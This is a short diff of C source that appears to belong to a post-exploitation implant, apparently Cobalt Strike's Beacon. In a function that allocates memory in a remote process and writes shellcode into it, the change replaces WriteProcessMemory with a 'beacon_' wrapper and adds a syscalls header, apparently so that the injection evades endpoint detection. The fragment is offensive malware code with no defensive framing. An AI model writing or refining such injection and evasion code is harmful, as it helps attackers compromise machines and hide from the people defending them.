@@ -11,6 +11,7 @@
 #include "tokens.h"
 #include "functions.h"
 #include "bformat.h"
+#include "syscalls.h"
 #include <bcrypt.h>
 
 #define ALLOCATOR_VIRTUALALLOCEX     0
@@ -90,7 +91,7 @@ char * remote_mirror_data_virtualallocex(HANDLE hProcess, DWORD pid, char * buff
 
 	/* write our shellcode to the process */
 	while (total < length) {
-		if (!WriteProcessMemory(hProcess, (char *)ptr + total, buffer + total, length - total, &wrote)) {
+		if (!beacon_WriteProcessMemory(hProcess, (char *)ptr + total, buffer + total, length - total, &wrote)) {
 			post_error_d(0x10, GetLastError());
 			VirtualFree(ptr, 0, MEM_RELEASE);
 			return NULL;
